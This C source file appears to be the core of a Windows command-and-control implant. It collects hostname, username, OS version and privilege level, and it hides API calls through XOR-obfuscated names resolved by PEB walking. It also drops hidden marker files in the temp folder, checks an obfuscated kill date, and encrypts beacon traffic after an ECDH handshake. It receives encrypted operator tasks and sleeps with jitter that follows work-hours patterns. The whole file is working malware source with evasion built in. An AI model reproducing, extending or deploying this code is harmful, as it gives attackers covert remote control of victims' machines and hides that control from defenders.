#include "beacon.h"
#include "agent_config.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include "crypto.h"
#include "evasion.h"
#include "adv_lazy.h"
#include <windows.h>
#include <bcrypt.h>
#include <lm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* Decode one XOR-obfuscated config string from agent_config.h */
static void _cfg_decode(const unsigned char *src, size_t len, char *dst)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = (char)(src[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN]);
    dst[len] = '\0';
}

/* GetComputerNameA — removes from IAT */
typedef BOOL (WINAPI *_GCN_t)(LPSTR, LPDWORD);
static BOOL _gcna(LPSTR buf, LPDWORD sz) {
    static _GCN_t fn = NULL;
    if (!fn) {
        char fs[20], ks[14]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetComputerNameA); i++) fs[i] = (char)(EVS_fn_GetComputerNameA[i] ^ xk);
        fs[sizeof(EVS_fn_GetComputerNameA)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks); SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (_GCN_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn ? fn(buf, sz) : FALSE;
}

/* machine fingerprinting */

void agent_get_hostname(char *buf, size_t len)
{
    DWORD sz = (DWORD)len;
    if (!_gcna(buf, &sz))
        strncpy(buf, "unknown", len - 1);
    buf[len - 1] = '\0';
}

void agent_get_username(char *buf, size_t len)
{
    DWORD sz = (DWORD)len;
    if (!GetUserNameA(buf, &sz))
        strncpy(buf, "unknown", len - 1);
    buf[len - 1] = '\0';
}

/* GetNativeSystemInfo — removes from IAT */
typedef void (WINAPI *_GNS_t)(LPSYSTEM_INFO);
static void _gns(LPSYSTEM_INFO si) {
    static _GNS_t fn = NULL;
    if (!fn) {
        char fs[22], ks[14]; volatile unsigned char xk = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_GetNativeSystemInfo); i++) fs[i] = (char)(EVS_fn_GetNativeSystemInfo[i] ^ xk);
        fs[sizeof(EVS_fn_GetNativeSystemInfo)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_kernel32); i++) ks[i] = (char)(EVS_dll_kernel32[i] ^ xk);
        ks[sizeof(EVS_dll_kernel32)] = '\0';
        HMODULE m = _peb_module(ks); SecureZeroMemory(ks, sizeof(ks));
        if (m) fn = (_GNS_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    if (fn) fn(si);
    else GetSystemInfo(si);
}

void agent_get_os(char *buf, size_t len)
{
    OSVERSIONINFOEXW osvi;
    memset(&osvi, 0, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS(WINAPI * RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    char _dn[10], _fn[15];
    EVS_D(_dn, EVS_dll_ntdll); EVS_D(_fn, EVS_fn_RtlGetVersion);
    HMODULE ntdll = _peb_module(_dn); SecureZeroMemory(_dn, sizeof(_dn));
    RtlGetVersion_t fn = (RtlGetVersion_t)(void *)GetProcAddress(ntdll, _fn);
    SecureZeroMemory(_fn, sizeof(_fn));
    if (fn && fn((PRTL_OSVERSIONINFOW)&osvi) == 0)
    {
        int is64 = 0;
        SYSTEM_INFO si;
        _gns(&si);
        is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
        snprintf(buf, len, "Windows %lu.%lu Build %lu %s",
                 osvi.dwMajorVersion, osvi.dwMinorVersion,
                 osvi.dwBuildNumber, is64 ? "x64" : "x86");
    }
    else
    {
        strncpy(buf, "Windows (unknown)", len - 1);
        buf[len - 1] = '\0';
    }
}

void agent_get_privileges(char *buf, size_t len)
{
    HANDLE token;
    if (!adv_get()->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
    {
        strncpy(buf, "user", len - 1);
        buf[len - 1] = '\0';
        return;
    }
    TOKEN_ELEVATION elev;
    DWORD ret_len = 0;
    if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &ret_len) && elev.TokenIsElevated)
        strncpy(buf, "elevated", len - 1);
    else
        strncpy(buf, "user", len - 1);
    buf[len - 1] = '\0';
    CloseHandle(token);
}

/* DJB2 hash for stable 8-hex agent ID */

static uint32_t djb2(const char *s)
{
    uint32_t h = 5381;
    int c;
    while ((c = (unsigned char)*s++) != 0)
        h = ((h << 5) + h) ^ c;
    return h;
}

void agent_gen_id(char *id_out)
{
    char host[256], user[128];
    agent_get_hostname(host, sizeof(host));
    agent_get_username(user, sizeof(user));

    BOOL elevated = FALSE;
    HANDLE tok;
    if (adv_get()->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION e; DWORD sz = sizeof(e);
        if (GetTokenInformation(tok, TokenElevation, &e, sz, &sz))
            elevated = e.TokenIsElevated;
        CloseHandle(tok);
    }

    char combined[400];
    if (elevated)
        snprintf(combined, sizeof(combined), "%s|%s|%lu",
                 host, user, (unsigned long)GetCurrentProcessId());
    else
        snprintf(combined, sizeof(combined), "%s|%s", host, user);

    uint32_t h = djb2(combined);
    snprintf(id_out, AGENT_ID_LEN + 1, "%08x", h);
}

static void _parent_tmp_path(char *out, size_t sz)
{
    char tmp[MAX_PATH];
    GetTempPathA((DWORD)sizeof(tmp), tmp);
    char host[256], user[128];
    agent_get_hostname(host, sizeof(host));
    agent_get_username(user, sizeof(user));
    char combined[400];
    snprintf(combined, sizeof(combined), "%s|%s", host, user);
    uint32_t h = djb2(combined);
    snprintf(out, sz, "%s~DF%08X.tmp", tmp, h);
}

void agent_write_parent_id(const char *id)
{
    char path[MAX_PATH];
    _parent_tmp_path(path, sizeof(path));
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f == INVALID_HANDLE_VALUE) return;
    DWORD wr = 0;
    WriteFile(f, id, (DWORD)strlen(id), &wr, NULL);
    CloseHandle(f);
}

static void _gs_tmp_path(char *out, size_t sz)
{
    char tmp[MAX_PATH];
    GetTempPathA((DWORD)sizeof(tmp), tmp);
    char host[256], user[128];
    agent_get_hostname(host, sizeof(host));
    agent_get_username(user, sizeof(user));
    char combined[400];
    snprintf(combined, sizeof(combined), "%s|%s", host, user);
    uint32_t h = djb2(combined);
    snprintf(out, sz, "%s~GS%08X.tmp", tmp, h);
}

void agent_write_gs_flag(void)
{
    char path[MAX_PATH];
    _gs_tmp_path(path, sizeof(path));
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f != INVALID_HANDLE_VALUE) CloseHandle(f);
}

int agent_read_gs_flag(void)
{
    char path[MAX_PATH];
    _gs_tmp_path(path, sizeof(path));
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) return 0;
    DeleteFileA(path);
    return 1;
}

int agent_gs_flag_exists(void)
{
    char path[MAX_PATH];
    _gs_tmp_path(path, sizeof(path));
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

/* agent lifecycle */

int agent_init(agent_ctx_t *ctx)
{
    memset(ctx, 0, sizeof(*ctx));

    /* kill date check, exit silently if past configured timestamp */
#if CFG_KILL_DATE_LEN > 1
    {
        char kd_str[24] = {0};
        _cfg_decode(CFG_KILL_DATE, CFG_KILL_DATE_LEN, kd_str);
        uint32_t kill_ts = (uint32_t)strtoul(kd_str, NULL, 10);
        if (kill_ts > 0 && (uint32_t)time(NULL) > kill_ts)
            ExitProcess(0);
    }
#endif

    agent_gen_id(ctx->agent_id);

    ctx->parent_id[0] = '\0';
    {
        char path[MAX_PATH];
        _parent_tmp_path(path, sizeof(path));
        HANDLE f = CreateFileA(path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            DWORD rd = 0;
            ReadFile(f, ctx->parent_id, AGENT_ID_LEN, &rd, NULL);
            ctx->parent_id[AGENT_ID_LEN] = '\0';
            CloseHandle(f);
            DeleteFileA(path);
        }
    }

    agent_get_hostname(ctx->hostname, sizeof(ctx->hostname));
    agent_get_username(ctx->username, sizeof(ctx->username));
    agent_get_os(ctx->os_info, sizeof(ctx->os_info));
    agent_get_privileges(ctx->privileges, sizeof(ctx->privileges));

    ctx->pending_output = calloc(1, OUTPUT_BUF_SIZE);
    if (!ctx->pending_output)
        return -1;

    if (crypto_init(&ctx->crypto) != 0)
    {
        free(ctx->pending_output);
        ctx->pending_output = NULL;
        return -1;
    }

    /* generate ECDH keypair for the handshake */
    if (crypto_gen_keypair(ctx->crypto.agent_pubkey,
                           ctx->crypto.agent_privkey) != 0)
    {
        crypto_free(&ctx->crypto);
        free(ctx->pending_output);
        ctx->pending_output = NULL;
        return -1;
    }

    return 0;
}

void agent_free(agent_ctx_t *ctx)
{
    crypto_free(&ctx->crypto);
    free(ctx->pending_output);
    memset(ctx, 0, sizeof(*ctx));
}

/* output buffer */

void beacon_append_output(agent_ctx_t *ctx, const char *data, size_t len)
{
    if (ctx->output_len >= OUTPUT_BUF_SIZE - 1)
        return;
    size_t avail = OUTPUT_BUF_SIZE - ctx->output_len - 1;
    if (len > avail)
        len = avail;
    memcpy(ctx->pending_output + ctx->output_len, data, len);
    ctx->output_len += len;
    ctx->pending_output[ctx->output_len] = '\0';
}

void beacon_clear_output(agent_ctx_t *ctx)
{
    memset(ctx->pending_output, 0, ctx->output_len + 1);
    ctx->output_len = 0;
}

/* JSON helpers */

/* escape a string for JSON, returns malloc'd buffer */
static char *json_escape(const char *s)
{
    size_t in_len = strlen(s);
    /* worst case: each char → \uXXXX = 6 bytes */
    char *out = malloc(in_len * 6 + 3);
    if (!out)
        return NULL;
    char *p = out;
    while (*s)
    {
        switch (*s)
        {
        case '"':
            *p++ = '\\';
            *p++ = '"';
            break;
        case '\\':
            *p++ = '\\';
            *p++ = '\\';
            break;
        case '\n':
            *p++ = '\\';
            *p++ = 'n';
            break;
        case '\r':
            *p++ = '\\';
            *p++ = 'r';
            break;
        case '\t':
            *p++ = '\\';
            *p++ = 't';
            break;
        default:
            if ((unsigned char)*s < 0x20 || (unsigned char)*s >= 0x80)
            {
                /* escape control chars and non-ASCII as \u00xx */
                int _n = snprintf(p, 7, "\\u%04x", (unsigned char)*s);
                if (_n > 0)
                    p += _n;
            }
            else
            {
                *p++ = *s;
            }
        }
        s++;
    }
    *p = '\0';
    return out;
}

/* packet builders */

/* plaintext handshake packet, base64-encoded for transport */
char *beacon_build_handshake(agent_ctx_t *ctx)
{
    char *pubkey_b64 = base64_encode(ctx->crypto.agent_pubkey, X25519_KEY_SIZE);
    if (!pubkey_b64)
        return NULL;

    size_t needed = 128 + strlen(pubkey_b64);
    char *pkt = malloc(needed);
    if (!pkt)
    {
        free(pubkey_b64);
        return NULL;
    }

    snprintf(pkt, needed,
             "{\"t\":\"h\",\"id\":\"%s\",\"pk\":\"%s\"}",
             ctx->agent_id, pubkey_b64);

    free(pubkey_b64);

    /* base64-encode for transport */
    char *b64 = base64_encode((const uint8_t *)pkt, strlen(pkt));
    free(pkt);
    return b64;
}

/* build encrypted beacon: JSON → seal → base64 */
char *beacon_build(agent_ctx_t *ctx)
{
    char *out_esc = json_escape(ctx->pending_output);
    if (!out_esc)
        return NULL;

    /* build JSON */
    size_t json_sz = 512 + strlen(out_esc) + strlen(ctx->hostname) + strlen(ctx->username) + strlen(ctx->os_info) + 32;
    char *json = malloc(json_sz);
    if (!json)
    {
        free(out_esc);
        return NULL;
    }

    snprintf(json, json_sz,
             "{\"t\":\"s\","
             "\"id\":\"%s\","
             "\"hn\":\"%s\","
             "\"un\":\"%s\","
             "\"os\":\"%s\","
             "\"pr\":\"%s\","
             "\"lt\":\"%s\","
             "\"pid\":\"%s\","
             "\"po\":\"%s\"}",
             ctx->agent_id,
             ctx->hostname,
             ctx->username,
             ctx->os_info,
             ctx->privileges,
             ctx->last_task_id,
             ctx->parent_id,
             out_esc);
    free(out_esc);

    /* encrypt */
    size_t sealed_len = 0;
    uint8_t *sealed = crypto_seal(&ctx->crypto,
                                  (const uint8_t *)json, strlen(json),
                                  &sealed_len);
    free(json);
    if (!sealed)
        return NULL;

    /* base64 for transport */
    char *b64 = base64_encode(sealed, sealed_len);
    free(sealed);
    return b64;
}

/* response parser */

/* extract string value from flat JSON */
static int json_get_str(const char *json, const char *key,
                        char *out, size_t out_sz)
{
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p)
        return -1;
    p += strlen(search);
    while (*p == ' ')
        p++;
    if (*p != '"')
        return -1;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i < out_sz - 1)
    {
        if (*p == '\\' && *(p + 1))
        {
            p++;
        }
        out[i++] = *p++;
    }
    out[i] = '\0';
    return 0;
}

/* same as json_get_str but heap-allocates output, caller frees */
static int json_get_str_alloc(const char *json, const char *key, char **out)
{
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char *p = strstr(json, search);
    if (!p)
        return -1;
    p += strlen(search);
    while (*p == ' ')
        p++;
    if (*p != '"')
        return -1;
    p++;
    /* measure length */
    const char *start = p;
    size_t len = 0;
    while (*p && *p != '"')
    {
        if (*p == '\\' && *(p + 1))
            p++;
        p++;
        len++;
    }
    *out = (char *)malloc(len + 1);
    if (!*out)
        return -1;
    /* copy */
    p = start;
    size_t i = 0;
    while (*p && *p != '"')
    {
        if (*p == '\\' && *(p + 1))
            p++;
        (*out)[i++] = *p++;
    }
    (*out)[i] = '\0';
    return 0;
}

/* parse inbound base64 packet, handles handshake and encrypted task */
int beacon_parse_response(agent_ctx_t *ctx, const char *raw_b64,
                          char *cmd_out, size_t cmd_sz,
                          char *args_out, size_t args_sz,
                          char *task_id_out, size_t task_id_sz,
                          char **data_out)
{
    if (!raw_b64 || raw_b64[0] == '\0')
        return -1;

    /* base64-decode the packet */
    size_t decoded_len = 0;
    uint8_t *decoded = base64_decode(raw_b64, &decoded_len);
    if (!decoded)
        return -1;

    char *json = NULL;

    if (!ctx->handshake_done)
    {
        /* plaintext handshake response */
        json = (char *)decoded;
        char type_buf[32] = {0};
        json_get_str(json, "t", type_buf, sizeof(type_buf));

        if (strcmp(type_buf, "hr") == 0)
        {
            char spub_b64[64] = {0};
            if (json_get_str(json, "spk", spub_b64, sizeof(spub_b64)) == 0)
            {
                size_t spub_len = 0;
                uint8_t *spub = base64_decode(spub_b64, &spub_len);
                if (spub && spub_len == X25519_KEY_SIZE)
                {
                    if (crypto_do_handshake(&ctx->crypto, spub) == 0)
                        ctx->handshake_done = 1;
                }
                free(spub);
            }
        }
        free(decoded);
        return ctx->handshake_done ? 0 : -1;
    }

    /* encrypted task packet */
    size_t pt_len = 0;
    uint8_t *pt = crypto_open(&ctx->crypto, decoded, decoded_len, &pt_len);
    free(decoded);
    if (!pt)
        return -1;

    json = (char *)pt;

    char type_buf[32] = {0};
    json_get_str(json, "t", type_buf, sizeof(type_buf));

    int ret = -1;
    if (strcmp(type_buf, "t") == 0)
    {
        json_get_str(json, "tid", task_id_out, task_id_sz);
        json_get_str(json, "c", cmd_out, cmd_sz);
        json_get_str(json, "a", args_out, args_sz);
        if (data_out)
            json_get_str_alloc(json, "d", data_out);
        ret = 0;
    }
    else if (strcmp(type_buf, "n") == 0)
    {
        cmd_out[0] = '\0';
        ret = 0;
    }

    free(pt);
    return ret;
}

/* beacon sleep with jitter and work-hours gating */

void beacon_sleep(void)
{
#if JITTER_PCT == 0
    beacon_sleep_obf(BEACON_INTERVAL);
#else
    SYSTEMTIME st;
    GetLocalTime(&st);

    BOOL off_hours = (st.wHour < 8 || st.wHour >= 20);
    BOOL weekend = (st.wDayOfWeek == 0 || st.wDayOfWeek == 6);

    if (off_hours || weekend)
    {
        beacon_sleep_obf(BEACON_INTERVAL * 2);
        return;
    }

    /* BCryptGenRandom: cryptographic distribution, avoids predictable rand() */
    uint32_t rnd = 0;
    BCryptGenRandom(NULL, (BYTE *)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    double jitter_range = BEACON_INTERVAL * (JITTER_PCT / 100.0);
    double offset = jitter_range * (((double)(rnd & 0xFFFF) / 0xFFFF) * 2.0 - 1.0);
    beacon_sleep_obf((DWORD)(BEACON_INTERVAL + (long)offset));
#endif
}
